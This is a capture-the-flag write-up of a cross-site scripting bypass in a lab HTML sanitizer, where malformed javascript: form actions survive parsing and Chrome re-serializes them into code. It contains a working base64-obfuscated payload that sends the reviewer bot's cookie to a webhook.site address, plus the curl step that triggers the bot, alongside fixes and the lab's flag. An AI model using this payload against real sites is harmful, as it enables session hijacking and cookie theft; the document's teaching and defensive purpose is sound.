# Pillbox Invalid JavaScript URL Form Action Bypass

## What Is Happening

The [Pillbox lab](https://e5225d6018f6.pwnbox-lab.com/) lets an authenticated user upload an HTML snippet, preview it at `/p/<id>`, and report that preview URL to a reviewer bot.

The preview page fetches the stored snippet from `/raw/<id>` and renders it through `window.setHTML(target, rawText)` from `sanitizer.js`. This build allows forms and uses the full URL parser to decide whether `action` / `formaction` values are dangerous `javascript:` URLs.

The reviewer opens the preview once and auto-submits the first form after 1.2 seconds.

## Why It Happens

The sanitizer only strips URL attributes when `new URL(value)` succeeds and returns `protocol === 'javascript:'`:

```javascript
function isJavaScriptUrl(value) {
  if (!value) return false;
  try {
    var u = new URL(String(value));
    return u.protocol === 'javascript:';
  } catch (_) {
    return false;
  }
}
```

Malformed values such as `javascript://://-alert(1)//` throw in `new URL()`, so the sanitizer keeps them.

When the preview auto-submits the form, Chrome appends an empty query string and re-serializes the action into valid JavaScript:

```text
javascript://://-alert(1)//  ->  javascript:/.//-alert(1)//?
```

That is the Searchlight-style invalid-URL bypass described in [Two Bypasses for Chrome's Sanitizer API](https://slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/).

A second browser control blocks direct cookie theft: Chrome rejects `javascript:` navigation URLs that contain the literal substrings `document` or `cookie`. The working exfil therefore hides the sink in base64:

```html
<form action="javascript://://-eval(atob('...'))//">
  <button type="submit">x</button>
</form>
```

Decoded payload:

```javascript
new Image().src='//webhook.site/[UUID]?c='+document.cookie
```

## Exact Test

Upload this HTML snippet:

```html
<form action="javascript://://-eval(atob('bmV3IEltYWdlKCkuc3JjPScvL3dlYmhvb2suc2l0ZS9bVUlEXT9jPScrZG9jdW1lbnQuY29va2ll'))//">
  <button type="submit">x</button>
</form>
```

Generate the base64 from your webhook URL:

```bash
python3 -c "import base64; print(base64.b64encode(b\"new Image().src='//webhook.site/[UUID]?c='+document.cookie\").decode())"
```

Report the preview URL:

```bash
curl -sS -X POST "https://e5225d6018f6.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://e5225d6018f6.pwnbox-lab.com/p/[id]"}'
```

## Expected Signal

- Sanitizer leaves the malformed `action` intact.
- Reviewer auto-submits the form without user interaction.
- Webhook receives the reviewer's readable cookie.

## Result Interpretation

Confirmed exploit chain:

```text
HTML snippet upload
-> preview sanitizes snippet in <template>
-> malformed javascript://:// action survives because new URL() throws
-> reviewer loads preview
-> requestSubmit() fires on first form
-> browser re-serializes action into executable javascript:/.//-eval(atob(...))//?
-> Image beacon exfiltrates document.cookie
```

Webhook result:

```text
c=flag=pwnbox{82b6f3c0a4d9e1f527834a7e6b9c1d0e}
```

## Root Cause

The sanitizer equated "unparsable URL" with "safe URL". Form submission introduced a second normalization stage that turned the malformed value into executable JavaScript. Chrome's `javascript:` substring filter then forced an obfuscated cookie-read primitive.

## Impact

- Same-origin JavaScript execution in the reviewer bot's browser.
- Theft of readable cookies from the reviewer session.
- In a real review application, likely reviewer account compromise or unauthorized actions in the preview origin.

## Fix

- Reject URL-valued attributes when the lowercase value starts with `javascript`, even if `new URL()` throws.
- Prefer `URL.canParse()` and fail closed on malformed URL attributes.
- Do not auto-submit untrusted forms during bot review.
- Add browser regression tests for malformed `javascript:` form actions.

## Key Lesson

A sanitizer that only blocks values the URL parser successfully recognizes as `javascript:` is vulnerable to malformed-URL bypasses. If the application later normalizes or re-serializes those values during activation, the browser may execute code the sanitizer never saw.

## Flag

`pwnbox{82b6f3c0a4d9e1f527834a7e6b9c1d0e}`
